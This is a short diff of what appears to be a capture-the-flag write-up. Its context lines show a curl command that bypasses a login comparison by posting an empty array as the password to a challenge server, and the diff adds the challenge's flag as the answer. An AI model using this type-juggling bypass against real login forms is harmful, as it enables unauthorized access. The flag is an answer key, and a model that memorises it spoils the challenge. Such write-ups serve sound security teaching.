@@ -21,3 +21,8 @@
   curl -s -X POST 'http://206.189.59.199:8003/' -d 'username=admin&password[]=&submit=Login' \
   | tail -n1 | awk -F'Flag: ' '{print $2}' | cut -d' ' -f1
   ```
+
+<br/>
+
+## Flag:
+`flag{byp455_7h3_c0mp4r4710n}`
